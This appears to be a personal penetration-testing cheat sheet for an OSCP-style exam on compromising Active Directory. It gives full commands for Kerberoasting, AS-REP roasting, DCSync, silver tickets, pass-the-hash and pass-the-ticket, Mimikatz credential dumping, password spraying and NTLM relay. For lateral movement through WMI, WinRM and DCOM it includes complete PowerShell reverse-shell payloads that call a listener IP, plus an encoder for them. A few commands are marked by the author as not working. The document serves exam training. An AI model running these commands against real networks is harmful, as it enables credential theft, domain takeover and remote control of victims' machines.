
1) PrivEsc on first machine (10 points)
	1) Post-exploitation creds for next machine and set up pivot (10 points)
2) PrivEsc + post-exploitation creds for domain admin (20 points)

# Methodology

- [ ] Reminder that local admin passwords are often reused
- [ ] Discover domain controllers
- [ ] Group Policy in SYSVOL
- [ ] Identify Kerberos-enabled users / AS-REP roast
- [ ] BloodHound
- [ ] Kerberoast
- [ ] Local privilege escalation
- [ ] Credential harvesting
- [ ] DCSync attack
- [ ] Pass the hash
- [ ] Overpass the hash
- [ ] Pass the ticket
- [ ] Silver Ticket (TGS) forgery
- [ ] PsExec
- [ ] WMI & WinRM
- [ ] Evil-WinRM
- [ ] DCOM

### Auth Attacks & Pivoting: Table

| Attack                           | Summary                                                                                               | When to Use                                                                          | Prerequisites                                                                                                                                                                                                                                             | Effect                                                 |
| -------------------------------- | ----------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------ |
| **AS-REP Roasting**              | Target Kerberos accounts with pre-auth disabled; crack AS-REP hashes                                  | When spotting a user without Kerberos preauth enforced                               | Kerberos preauthentication not enforced                                                                                                                                                                                                                   | Encrypted TGT (must be cracked, cannot pass the hash)  |
| **Kerberoasting**                | Request Kerberos service tickets for service accounts; crack hashes                                   | Spotted service account with SPN                                                     | Target must be a service account; aka, have a Service Principal Name (SPN) associated with the account                                                                                                                                                    | Encrypted TGS (must be cracked, cannot pass the hash)  |
| **DCSync Attack**                | Impersonate DC to retrieve sensitive data like NTLM hashes                                            | Control an account with replication rights                                           | Access to a user that is in one of these groups: **Domain Admins, Enterprise Admins, or Administrators**                                                                                                                                                  | NTLM Hash (pass-the-hash possible)                     |
| **Pass the Hash**                | Auth with NTLM hashes directly                                                                        | NTLM hash and the service uses NTLM auth                                             | NTLM authentication accepted                                                                                                                                                                                                                              | Authenticate with a hash                               |
| **Overpass the Hash**            | Use NTLM hashes to request valid TGTs; Pivot from hash-based auth to Kerberos-based auth              | NTLM hash and want to authenticate via Kerberos auth instead of NTLM auth            | Target user must have logged onto this machine at some point (cached credentials)                                                                                                                                                                         | TGT; Pivot from hash-based auth to Kerberos-based auth |
| **Pass the Ticket**              | Auth with stolen Kerberos tickets directly                                                            | Stolen a Kerberos ticket                                                             | Kerberos authentication accepted; Ticket must be cached on device to steal                                                                                                                                                                                | Authenticate with a ticket                             |
| **Silver Ticket (TGS) Forgery**  | Forging TGS tickets using compromised service account hash; enables access to specific services in AD | Possess the password hash of a service account and want access to a specific service | Note: this only works on machines *without* **KB5008380**. This is enforced from October 1, 2022 onwards. SPN password hash; Domain SID (trivial); Target SPN                                                                                             | Enables access to specific services in AD              |
| **PsExec**                       | Windows/Kali lateral movement, connect via creds or hashes                                            | Lateral movement with SMB open                                                       | Credentials or hash; SMB (with some specific shares, e.g., `ADMIN$` enabled). Port 445                                                                                                                                                                    | Lateral movement with SMB                              |
| **WMI & WinRM** (and Evil-WinRM) | Lateral movement, remote management                                                                   | Lateral movement with WMI & WinRM open                                               | Credentials, hash, ticket. Port 135 for WMI. Ports 5985/5986 for WinRM                                                                                                                                                                                    | Lateral movement with WMI & WinRM                      |
| **DCOM**                         | RCE via WIndows RPC                                                                                   | Privileged account and need alternate path for RCE                                   | User must be local admin on the target machine. **Remote DCOM Access** via group membership (Administrators, Distributed COM Users, or a specific application group with DCOM permissions). DCOM requires RPC (135/TCP) and high-range dynamic ports.<br> | RCE                                                    |

### AD Permission Types

| Access Control Entry (ACE) | Permission                             |
| -------------------------- | -------------------------------------- |
| GenericAll                 | Full permissions on object             |
| GenericWrite               | Edit certain attributes on the object  |
| WriteOwner                 | Change ownership of the object         |
| WriteDACL                  | Edit ACE's applied to the object       |
| AllExtendedRights          | Change password, reset password, etc.  |
| ForceChangePassword        | Password change for object             |
| Self (Self-Membership)     | Add ourselves to, for example, a group |

# Methodology
## Reconnaissance & Enumeration
### 0) Credential Spraying
Reminder that local Admin passwords are often reused
### 1) Discover domain controllers:
- They usually have TCP/389 LDAP, TCP/88 Kerberos, and TCP/53 DNS open
```PowerShell
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
```
### 2) Identify Kerberos-Enabled Users:
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/beet -o kerberoast.hashes
```
### 3) BloodHound
[BloodHound](#bloodhound)

---
## AD Auth Attacks (Initial Exploitation)
### 3) AS-REP Roast
[AS-REP Roasting](#as-rep-roasting)
### 4) Kerberoast
[Kerberoasting](#kerberoasting)

--- 
## Privilege Escalation & Credential Extraction
### 5) Local privilege escalation techniques
Check `Windows (Blue).md`
### 6) Credential Harvesting
Check `Windows Quicksheet.md`
### 7) DCSync Attack
[DCSync Attack](#dcsync)

---
## Credential Attacks & Forged Tickets
### 8) Pass the Hash
[Pass the Hash](#pass-the-hash)
### 9) Overpass the Hash
[Overpass the Hash](#overpass-the-hash)
### 10) Pass the Ticket
[Pass the Ticket](#pass-the-ticket)
### 11) Silver Ticket (TGS) Forgery
[Silver Ticket (TGS) Forgery](#silver-tickets-tgs)

---
## Lateral Movement Techniques
### 12) PsExec
[PsExec](#psexec)
### 13) WMI & WinRM (and Evil-WinRM)
[WMI & WinRM](#wmi--winrm)
### 14) DCOM
[DCOM](#dcom)

---

# Quick Commands
mimikatz kerberos::golden using `/aes128:<key>` or `/aes256:<key>`
- `kerberos::golden /sid:<SID> /domain:<DOMAIN> /user:<USER> /aes256:<KEY> /ptt`

Impacket
Pass the ticket (PTT) with AES:
```
export KRB5CCNAME=krb5cc
python3 getTGT.py -aesKey <AES_KEY> <DOMAIN>/<USER>
```
- `python3 GetUserSPNs.py <DOMAIN>/<USER> -aesKey <AES_KEY> -dc-ip <DC_IP>`
	- Kerberoasting
- `python3 secretsdump.py <DOMAIN>/<USER> -aesKey <AES_KEY>@<DC_IP>`
	- DCSync
- `python3 psexec.py <DOMAIN>/<USER> -aesKey <AES_KEY>@<TARGET>`
	- Kerberos auth-based attacks (psexec, wmiexec, smbexec, etc.)
Rubeus
- `Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<KEY> /ptt`
	- Request a TGT
- `Rubeus.exe ptt /ticket:<base64ticket>`
	- Pass the ticket
- `Rubeus.exe kerberoast /aes256:<KEY> /domain:<DOMAIN> /user:<USER>`
	- Kerberoasting
- `Rubeus.exe tgtdeleg`
	- Dump TGTs and reuse with AES

Evil-WinRM
- `evil-winrm -i <TARGET-IP> -u "secura\username" -p '****'`
- `evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTLM_HASH>`
- `evil-winrm -i <target-ip> -u <user> --auth Kerberos -k --aesKey <AES256_key> -r <domain> --dc-ip <dc-ip>` (--auth and --dc-ip, THIS IS NOT A THING)
	- AES256
- `evil-winrm -i <target-ip> -u <user> --auth Kerberos -k -r <domain> --dc-ip <dc-ip>` (THIS IS NOT A THING)
	- Pass the (TGT) ticket. Uses the ticket in `KRB5CCNAME` env variable.
	1) Use `Rubeus.exe dump` to see all tickets in memory
		- Look for a TGT (`krbtgt`) and export it with `Rubeus.exe dump /luid:<LUID> /ticket:base64 > ticket.kirbi`
	2) Convert `.kirbi` to a ccache file (if you want to move the ticket to Linux)
		1) `python3 kirbi2ccache.py ticket.kirbi ticket.ccache`
	3) `export KRB5CCNAME=$(pwd)/ticket.ccache`
	4) Verify with `klist`

netexec / crackmapexec
- `--rid-brute`: Enumerate users via RID brute forcing (helpful with null sessions).

```bash
# Credential spraying / password testing
netexec smb 192.168.50.75-80 -u users.txt -p 'Password123!' -d corp.com --continue-on-success
# Enumerating Shares
netexec smb 192.168.1.100 -u user -p pass -d corp.com --shares
# Enumerating Users (requires credentials)
netexec smb 192.168.1.100 -u user -p pass -d corp.com --users
# Enumerating Groups
netexec smb 192.168.1.100 -u user -p pass -d corp.com --groups
# Enumerate Null Sessions
netexec smb 192.168.1.0/24 -u '' -p '' -d corp.com --shares
# Enumerating Sessions
netexec smb 192.168.1.100 -u user -p pass -d corp.com --sessions
# Executing Commands Remotely
netexec smb 192.168.1.100 -u Administrator -p pass -x 'powershell -enc <Base64EncodedPayload>'
# Pass-the-hash
netexec smb 192.168.1.100 -u Administrator -H <NTLM hash>
```

- `impacket-psexec -hashes ":e762fa8675acd7d26ab86eb2581233d2" exam.com/densvc@192.168.154.170`

Try without DOMAIN NAME ALSO
- `impacket-psexec -hashes ":e762fa8675acd7d26ab86eb2581233d2" densvc@192.168.154.170`

---
### BloodHound
1) `sudo neo4j start`
2) `bloodhound`

- `Find all Domain Admins`
- `Find Shortest Paths to Domain Admins`
	- `Shortest Paths to Domain Admins from Owned Principals`
- `List all Kerberoastable Accounts`
	- `Shortest Paths to Domain Admins from Kerberoastable Users`
- `List all AS-REP Roastable Accounts`
- Look for noteworthy ACLs
- `Unrolled Group Membership` for interesting groups

https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/

- Try `aclpwn.py` (interacts directly with BloodHound) or `Invoke-ACLPwn` to automate discovery and pwnage of ACLs in Active Directory that are unsafely configured
- Account Operators can modify memberships of "non-protected" groups
	- Can add user to `Exchange Windows Permissions` or `Exchange Trusted Subsystem` groups (take over MS Exchange Server)
- Check out Pass-The-Ticket

- **Adalanche** as a BloodHound alternative
	- Getting started: https://www.a6n.co.uk/2024/01/adalanche-adds-security-visualised.html

## Attacks on AD Auth
AS-REP Roasting: for specific users
Kerberoasting: for specific service accounts (SPNs)
Silver Tickets: same as Kerberoasting but no need to crack (we are forging our own Service Tickets)
DC Synchronization: hashes for any account in AD but must be Domain Admin, Enterprise Admin, or Administrator group

### AS-REP Roasting
> **Prerequisite**: Target must not enforce Kerberos preauthentication 
1) (Optional) enumerate
	1) Windows: Powerview's `Get-DomainUser -PreauthNotRequired`
	2) Kali: `impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/beet`
2) Attack
	1) Windows: `.\Rubeus.exe asreproast /nowrap /outfile:asreproast.hashes` 
		1) (this actually also enumerates for you)
	2) Kali: `impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/beet`
3) Crack: `sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o hashes.asreproast.cracked`

Extra: **Let's assume that we are conducting an assessment in which we cannot identify any AD users with the account option Do not require Kerberos preauthentication enabled. While enumerating, we notice that we have GenericWrite or GenericAll permissions on another AD user account. Using these permissions, we could reset their passwords, but this would lock out the user from accessing the account. We could also leverage these permissions to modify the User Account Control value of the user to not require Kerberos preauthentication. This attack is known as Targeted AS-REP Roasting. Notably, we should reset the User Account Control value of the user once we've obtained the hash.**
	- `Set-ADUser -Identity "username" -KerberosEncryptionType None` ChatGPT
	- `Get-ADUser -Identity "username" -Properties DoesNotRequirePreAuth` to confirm (chatGPT)

---
### Kerberoasting
> **Prerequisite**: Target must be a service account; aka, have a Service Principal Name (SPN) associated with the account
1) Enumeration is done automatically in attack-phase
2) Attack
	1) Windows: `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
		1) Doesn't need password for domain user
	2) Kali: `sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/beet -o kerberoast.hashes`
		1) If `impacket-GetUserSPNs` throws the error "**KRB_AP_ERR_SKEW(Clock skew too great)**," we need to synchronize the time of the Kali machine with the domain controller. We can use `ntpdate` or `rdate` to do so.
3) Crack
	1) `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

---

### Silver Tickets (TGS)
Common RIDs (the last part of a SID):

| RID | Security Principal    |
| --- | --------------------- |
| 500 | Administrator account |
| 501 | Guest account         |
| 502 | `krbtgt` account      |
| 512 | Domain Admins group   |
| 513 | Domain Users group    |
| 514 | Domain Guests group   |

Common `/service` options in `kerberos::golden`:

| Service Option     | SPN (Service Principal Name) | Purpose                                                   |
| ------------------ | ---------------------------- | --------------------------------------------------------- |
| `/service:krbtgt`  | `krbtgt/<DOMAIN>`            | Default for **Golden Tickets** (domain-wide access)       |
| `/service:cifs`    | `cifs/<SERVER>`              | File sharing and SMB access (lateral movement)            |
| `/service:http`    | `http/<SERVER>`              | Web applications and IIS services                         |
| `/service:ldap`    | `ldap/<SERVER>`              | LDAP directory access (used for AD enumeration)           |
| `/service:rpc`     | `rpc/<SERVER>`               | Remote Procedure Calls (RPC) for remote system management |
| `/service:host`    | `host/<SERVER>`              | Generic host services (used for remote desktop and WMI)   |
| `/service:ftp`     | `ftp/<SERVER>`               | FTP server access                                         |
| `/service:wsman`   | `wsman/<SERVER>`             | Windows Remote Management (WinRM) for PowerShell remoting |
| `/service:mssql`   | `mssql/<SERVER>`             | SQL Server database access                                |
| `/service:termsrv` | `termsrv/<SERVER>`           | Remote Desktop Protocol (RDP) access                      |
| `/service:smb`     | `smb/<SERVER>`               | Alternative to `cifs` for SMB access                      |
| `/service:svc`     | `svc/<SERVER>`               | Custom services running under specific service accounts   |
> **Prerequisites**:
> 1) Note: this only works on machines *without* **KB5008380**. This is enforced from October 1, 2022 onwards.
> 2) SPN password hash
> 3) Domain SID (trivial)
> 4) Target SPN
1) Enumerate to obtain the following 3 things:
	1) **SPN password hash**: Mimikatz `privilege::debug` then `sekurlsa::logonpasswords` and yoink the NTLM value for the service account
	2) **Domain SID**: `whoami /user`
		1) The domain SID is the whole thing minus the last part (e.g., just the highlighted part below)
			1) corp\jeff **S-1-5-21-1987370270-658905905-1781884369**-1105
	3) **Target SPN**: e.g., `HTTP/web04.corp.com:80` because we want to access the web page running on IIS
		1) Attempt to access before the attack with `iwr -UseDefaultCredentials http://web04`
		2) Enumerate with
			1) `setspn -L web04`
			2) `python3 GetUserSPNs.py corp.com/<user>:<password> -dc-ip <DC_IP> -outputfile spns.txt`
			3) `ldapsearch -x -h <domain controller> -D "<user>@<domain>" -W -b "dc=corp,dc=com" "(servicePrincipalName=*)" servicePrincipalName` (chatGPT)

2) Attack
	4) Mimikatz
		2) `kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jebadmin`
			1) Note: `jebadmin` (given user can be any existing user in the domain. If this doesn't work, try giving a user that is not the current user but exists in the domain)
			2) rc4 is the NTLM hash
3) Validate the new ticket is in-memory (thanks to above `/ptt` flag)
	1) `misc::cmd`
	2) Then, `klist`
4) Attempt to access after the attack `iwr -UseDefaultCredentials http://web04`
	2) For full page content:
```PowerShell
$response = Invoke-WebRequest -Uri "http://web04" -UseDefaultCredentials

$response.Content

# MSSQL
sqlcmd.exe -S DC01,1433
```

Good silver ticket resource:
https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md
Silver Ticket via Compromised Host:
```PowerShell
# obtain SID of domain (remove RID -XXXX) at the end of the user SID string.
cmd> whoami /user
corp\example S-1-5-21-1602875587-2787523311-2599479668[-1103]

# generate the Silver Ticket (TGS) and inject it into memory
mimikatz > kerberos::golden /user:[user_name] /domain:[domain_name].com /sid:[sid_value] /target:[service_hostname] /service:[service_type] /rc4:[hash] /ptt

# abuse Silver Ticket (TGS)
cmd> psexec.exe -accepteula \\<remote_hostname> cmd  # psexec
cmd> sqlcmd.exe -S [service_hostname] #  if service is MSSQL
```
Silver Ticket via Kali
```bash
# generate the Silver Ticket with NTLM
$ impacket-ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# set the ticket for impacket use
$ export KRB5CCNAME=<TGT_ccache_file_path>

# execute remote commands with any of the following by using the TGT
$ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
$ python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
$ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

```bash
impacket-ticketer -nthash '6a1a9d1717c62ff7aaffceb943851b5d' -domain-sid 'S-1-5-21-2512333080-3128024849-3533006164' -domain "oscp.exam" -spn "mssql/DC01" -dc-ip 10.10.81.152 tom_admin
```

---
### DCSync
> **Prerequisite**: have access to a user that is in one of these groups: **Domain Admins, Enterprise Admins, or Administrators**
1) Attack
	1) From Windows: Mimikatz:`lsadump::dcsync /user:corp\Administrator`
		1) `Administrator` is the user we want to obtain credentials for
	2) From Kali: `impacket-secretsdump -just-dc-user Administrator corp.com/jebadmin:"Password2023\!"@192.168.50.70`
		2) IP is for DC we are targeting
2) Crack: `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

### Relaying Net-NLTMv2
> Prerequisite: force a connection from a target computer to our attack box.
1) Start relay server
	1) `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."`
	2) `-t` indicates the target we want to access
	3) Avoid port conflict with initial footheld nc port
2) Start nc listener
	4) `nc -lvnp 443`
3) Force user on victim to connect to our fake/malicious relay server
	1) Using `dir \\192.168.119.2\test` to try to access it, which will attempt to authenticate. This IP is our Kali box hosting the relay server.
4) Netcat listener should have caught reverse shell at this point
---
--- 
# AD Lateral Movement
- **AS-REP Roasting/Kerberoasting** → Obtain valid user or service credentials → Use WMI/WinRM, PsExec, or Pass-the-Hash/Overpass-the-Hash for remote execution.
- **Silver Ticketing** → Forge service tickets → Directly employ Pass-the-Ticket lateral movement.
- **DC Synchronization** → Harvest NTLM hashes → Use Pass-the-Hash or Overpass-the-Hash techniques.

Each initial attack gives you a different “key” (credential, hash, or ticket) that unlocks the possibility to move laterally using the corresponding technique. This mapping isn’t always one-to-one—sometimes multiple harvesting methods feed into the same lateral movement method—but understanding the interplay between credential acquisition and remote access is crucial for both offensive operations and defensive mitigations, as emphasized in the OSCP/PWK curriculum.

---
## WMI & WinRM
4 different techniques in this section.
- WMI with `wmic` (deprecated)
	- Very easy
- WMI with PowerShell
	- Fairly tedious
- WinRM with `winrs`
	- Very easy
- WinRM with PowerShell Remoting
	- Fairly tedious but the best because you have a real PowerShell remote session instead of a hacky reverse shell

### WMI
> Prerequisites: "To create a process on the remote target via WMI, we need the credentials of a member of the *Administrators* local group (on the remote target)". Port TCP/135.
#### WMI with `wmic`
Simple RCE example 
```PowerShell
`wmic /node:192.168.50.73 /user:jen /password:Password123! process call create "calc"`
```
Reverse Shell RCE example
```PowerShell
wmic /node:192.168.50.73 /user:jen /password:Password123! process call create "powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.45.195',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\""
```
#### WMI with PowerShell
(Same prerequisites as above)
1) Create PowerShell base64 (UTF-16) payload
2) Start reverse listener
3) Create PSCredential object
4) Create CIM (Common Information Model) object
5) Invoke CIM Method

**1) Create PowerShell base64 (UTF-16) payload**
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

```
kali@kali:~$ python3 encode.py
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...
OwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```
Feed this output into step 5 `$Command` variable below

**2) Start reverse listener**
**3) Create PSCredential object**
```PowerShell
$username = 'jen';
$password = 'Password123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

**4) Create CIM object**
```PowerShell
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.141.73 -Credential $credential -SessionOption $Options
```

**5) Invoke CIM Method**
```PowerShell
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

### WinRM 
> Prerequisites: credentials, hash, or ticket. Ports TCP/5985 (HTTP) and/or TCP/5986 (HTTPS)
#### WinRM with WinRS
- Prerequisites: Supplied user must be part of the **Administrators** local group OR **Windows Remote Management** local group (on the target host)

- Simple RCE
```bash
winrs -r:files04 -u:jen -p:Password123!  "cmd /c hostname & whoami"
```
- Reverse shell RCE
	- Can get PowerShell base64 (UTF-16) payload from above
```bash
winrs -r:files04 -u:jen -p:Password123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```
### WinRM with PowerShell Remoting
- Prerequisites: same as above (part of **Administrators** OR **Windows Remote Management** local group)

1) Create PSCredential object
```PowerShell
$username = 'jen';
$password = 'Password123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```
1) Invoke `New-PSSession` with PSCredential object
```PowerShell
New-PSSession -ComputerName 192.168.141.73 -Credential $credential
```
1) Enter PSSession
```PowerShell
Enter-PSSession 1
```

---
## PsExec
> Prerequisites
	1) The user that authenticates to the target machine needs to be part of the **Administrators** local group
	2) **SMB** (445/TCP) (The _`ADMIN$`_ share must be available)
	3) **File and Printer Sharing has to be turned on**. (This is the only one that is *NOT* on by default)

Attack:
```bash
.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Password123! cmd
```

> The ADMIN$ share is a hidden administrative share on Windows systems that maps to the Windows installation folder—typically `C:\Windows`. This share is created by default for administrative purposes and allows remote access to the Windows directory for system management tasks.

---
## Pass the Hash

> Prerequisites: **Note that this will only work for servers or services using NTLM authentication, not for servers or services using Kerberos authentication.** 

> NOTE: **this method works for AD domain accounts and the built-in local `Administrator` account.** After a 2014 security update, this technique cannot be used to authenticate as any other local admin account. 

Attack:
`impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C123E Administrator@192.168.50.73`

---
## Overpass the Hash
- Overpass the Hash is overabusing the NTLM hash to grant a Kerberos TGT
	- Pass the Hash enables NTLM authentication
	- **Overpass the Hash enables Kerberos authentication**

> Prerequisite: target user must have logged onto this machine at some point (cached credentials) 

Attack:
1) Mimikatz setup
	1) `privilege::debug`
	2) `sekurlsa::logonpasswords` to get `jen`'s NTLM hash
2) Mimikatz `sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93123 /run:powershell`
3) `net use \\FILES04` or any other command that will require Kerberos auth in order to generate a TGT
4) `klist` to verify that TGT and TGS have been created
5) Success! Can now use any tools that require Kerberos authentication
	1) E.g., `.\PsExec.exe \\files04 cmd`

---
## Pass the Ticket
TGT (Overpass the Hash) only allows us to use it on the machine it was created for, but the TGS can be more flexible. (**I.e., you can move the `.kirbi` files to other hosts if desired**)

> Prerequisites: Tickets must be cached already

Attack:
1) Mimikatz setup
	1) `privilege::debug`
2) Mimikatz `sekurlsa::tickets /export`
3) Filter for TGT/TGS tickets with `dir *.kirbi`
4) Mimikatz (name of ticket corresponding to desired service) 
	1) Imports ticket (ideally a ticket from another user than your own)
	2) `kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`
5) `klist` to verify ticket import
6) Verify access
	1) E.g., PowerShell: `ls \\web04\backup`

---
## DCOM
> Prerequisites: User must be local admin on the target machine. **Remote DCOM Access** via group membership (Administrators, Distributed COM Users, or a specific application group with DCOM permissions). DCOM requires RPC (135/TCP) and high-range dynamic ports.

| Object Name        | Description                     |
| ------------------ | ------------------------------- |
| MMC20.Application  | Executes via MMC COM object     |
| ShellWindows       | Spawns Explorer shell instances |
| ShellBrowserWindow | Similar to ShellWindows         |
| Excel.Application  | Executes through Excel COM      |

Attack:
1) Instantiate a remote MMC 2.0 application; Modify target IP (last argument): `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))`
2) Start listener
3) Execute shell commands
	1) Simple RCE
		1) `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")`
	2) Reverse Shell RCE
		2) Replace the base64 (UTF-16) encoded PowerShell command below
		3) `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`

```bash
# Using MMC20.Application to get an interactive shell
impacket-dcomexec corp/user1:Password123@10.10.10.5 -object MMC20.Application
# With NTLM hash (Pass-the-Hash)
impacket-dcomexec corp/user1@10.10.10.5 -hashes :aac3b435b51404eeaad3b435b51404ee:bb36cf7a9393879f6b4e7e7a7d327d23 -object MMC20.Application
# Executing a single command instead of an interactive shell
impacket-dcomexec corp/user1:Password123@10.10.10.5 -object MMC20.Application -exec "whoami"
```

---

10 Common AD PrivEsc:
https://youtu.be/xowytiyooBk?si=BQ0C-htYE8qr6KgK
